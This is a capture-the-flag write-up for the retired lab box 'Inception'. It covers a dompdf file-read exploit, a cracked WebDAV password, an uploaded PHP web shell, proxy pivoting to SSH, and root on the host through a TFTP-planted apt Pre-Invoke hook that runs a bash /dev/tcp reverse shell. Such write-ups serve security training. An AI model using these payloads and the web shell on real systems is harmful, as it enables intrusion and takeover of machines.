# Inception

This is the write-up for the box Inception that got retired at the 14th April 2018.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.67    inception.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/inception.nmap 10.10.10.67
```

```markdown
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

## Checking HTTP (Port 80)

On the web page is one input field where it is possible to "Sign Up" with an email address. After a submit, it only displays "Thank you" back to us without sending any request to anywhere. In the HTML source code there is one comment at the bottom of the file:
```markdown
\<!-- Todo: test dompdf on php 7.x -->
```

This looks like a hint that [Dompdf](https://github.com/dompdf/dompdf) is installed on the web server and this can be confirmed by browsing to the path _/dompdf_ and see the configuration files. The _VERSION_ file reveals that it is **Dompdf 0.6.0**.

Lets look for vulnerabilities with **Searchsploit**:
```markdown
searchsploit dompdf
```

There is one called _"dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read"_ which is an arbitrary file read vulnerability. The PoC tells the following:
```markdown
http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
```

So lets try this to read _/ect/passwd_:
```markdown
http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

After sending this request, it provides a PDF file with a long Base64-encoded string:
```markdown
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL
```

Decoding the Base64 string:
```markdown
echo -n cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL | base64 -d

# Output
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr
```

This is the beginning of the _/etc/passwd_ file so reading files on the system works. When intercepting the response with a proxy like **Burpsuite**, it shows the full Base64-encoded string and when decoding that, it also shows the username _cobb_.

I wrote a script to automate this process that can be found in this repository called **inception_file-read.py**. With this script it is easy to navigate the file system.

### Getting command execution

When looking through the **Apache2 configuration** the file _etc/apache2/sites-enabled/000-default.conf_ has some interesting information about another directory:
```markdown
(...)
<Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
(...)
```

The file _/var/www/html/webdav_test_inception/webdav.passwd_ contains a username and a hashed password:
> webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0

So lets crack the hash with **Hashcat**:
```markdown
hashcat -m 1600 inception_webdav.hash /usr/share/wordlists/rockyou.txt
```

After a while the hash gets cracked:
> babygurl69

When browsing to _/webdav_test_inception_ it asks for the credentials and after providing them, the page responds with HTTP _403 Forbidden_ message.
As **WebDAV** is a protocol to create, change and move documents on a web server, we should try to upload a malicious PHP file:
```markdown
curl -vvv --upload-file cmd.php http://10.10.10.67/webdav_test_inception/cmd.php --user webdav_tester:babygurl69
```

The _cmd.php_ contains the following PHP code:
```markdown
<?php echo system($\_REQUEST['cmd']); ?>
```

It got uploaded successfully and command execution works:
```markdown
http://10.10.10.67/webdav_test_inception/cmd.php?cmd=whoami
```

This displays the output of the `whoami` command.
When trying out different reverse shell commands, the box never connects to our local client, because there is probably a firewall that prevents it from that.

After enumerating the web application more, I found the directory _/wordpress_4.8.3_.
With the custom Python script, I attempted to read the Wordpress configuration file _wp-config.php_ which exists in _/var/www/html/wordpress_4.8.3/wp-config.php_. In this file there is a database password, that could be used later:
```markdown
/** MySQL database username \*/
define('DB_USER', 'root');

/** MySQL database password \*/
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');

/** MySQL hostname \*/
define('DB_HOST', 'localhost');
```

Lets see if the **Squid proxy** has some more information to proceed.

## Checking HTTP Proxy (port 3128)

The HTTP proxy on port 3128 is a **Squid proxy** without authentication that can be added in our proxy list in the browser and into **proxychains.conf** so that commands go through the proxy.
```markdown
vim /etc/proxychains.conf

# Add proxy to proxychains
http 10.10.10.67 3128
```

When browsing to _127.0.0.1_ it shows the HTTP page from before and confirms that the proxy connection works.
Now an Nmap scan through **proxychains** will have one more open port than before:
```markdown
proxychains nmap -sT -n -o nmap/inception_throughproxy.nmap 127.0.0.1
```

```markdown
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3128/tcp open  squid-http
```

As SSH is open, we try the password from the WordPress database with root and the user _cobb_:
```markdown
proxychains ssh cobb@127.0.0.1
```

The password _"VwPddNh7xMZyDQoByQL4"_ works on the user _cobb_ and logs us in on the box.

## Privilege Escalation

Looking at the `sudo` privileges of _cobb_, it shows the following:
```markdown
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```

It is possible to run everything as root, so lets change user to root:
```markdown
sudo su -l
```

Our privileges got escalated to root!

## Getting root.txt

Unfortunately _root.txt_ does not have the correct flag in it but instead it says:
```markdown
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```

We should run any **Linux Enumeration script** to get more information about the box.
After analyzing the network settings, it becomes clear that this is not the correct box, because it has a different IP address:
```markdown
eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
          (...)
```

So this is probably a guest system and the host system _192.168.0.1_ is probably the host. To scan the ports on the host, a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) is needed on the guest:
```markdown
curl -vvv --upload-file static-nmap http://10.10.10.67/webdav_test_inception/static-nmap --user webdav_tester:babygurl69

mv /var/www/html/webdav_test_inception/static-nmap /dev/shm/

chmod +x static-nmap

./static-nmap
```

Starting a port scan on the host:
```markdown
./static-nmap 192.168.0.1
```

```markdown
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
MAC Address: FE:30:80:A5:AE:4F (Unknown)
```

### Checking FTP (Port 21)

The first thing to try on the FTP service is to look if _anonymous login_ is enabled and it is, so it can be accessed:
```markdown
ftp 192.168.0.1
```

It shows the root (/) of the file system that can be enumerated for services _(/etc/init.d/)_, network connections _(/proc/net/)_ and so on.
The service _/etc/init.d/tftpd-hpa_ was not shown in the Nmap scan, so download that file to see the configuration of that service:
```markdown
ftp> get tftpd-hpa
```

The interesting part is where the configuration file is:
```markdown
(...)
DEFAULTS="/etc/default/tftpd-hpa"
(...)
```

Downloading the **TFTP** configuration file:
```markdown
ftp> get /etc/default/tftpd-hpa
```

The service runs on port 69:
```markdown
TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```

Accessing the TFTP service:
```markdown
tftp 192.168.0.1
```

It does not have any files or directories but we have the ability to upload files:
```markdown
tftp> put test /tmp/test
```

On FTP it can be seen that the file is indeed there and the UID is 0, so files get uploaded with root permissions:
```markdown
-rw-rw-rw-    1 0   0   0   Jun 20 20:11 test
```

Lets see if there are **Cronjobs** for root to abuse:
```markdown
tftp> get /etc/crontab
```
```markdown
(...)
\*/5 *   * * *    root    apt update 2>&1 >/var/log/apt/custom.log
30 23    * * *    root    apt upgrade -y 2>&1 >/dev/null
```

Root runs `apt update` every 5 minutes. When creating a pre-invoke script for `apt` it could eventually lead to command execution.

#### Exploiting Advanced Packaging Tool (apt)

Lets create a configuration file in _/etc/apt/_ that I will call _00shell_ with the following content:
```markdown
APT::Update::Pre-Invoke {"/bin/bash /tmp/shell.sh"}
```

The _shell.sh_ starts a reverse shell to the guest on port 8000:
```markdown
#!/bin/bash

bash -i >& /dev/tcp/192.168.0.10/8000 0>&1
```

Uploading the files:
```markdown
tftp> put 00shell /etc/apt/apt.conf.d/00shell

tftp> put shell.sh /tmp/shell.sh
```

Starting the listener on the guest 192.168.0.10:
```markdown
nc -lvnp 8000
```

After 5 minutes the listener on the guest on port 8000 starts a reverse shell session as root on the host system and we can read _root.txt_!
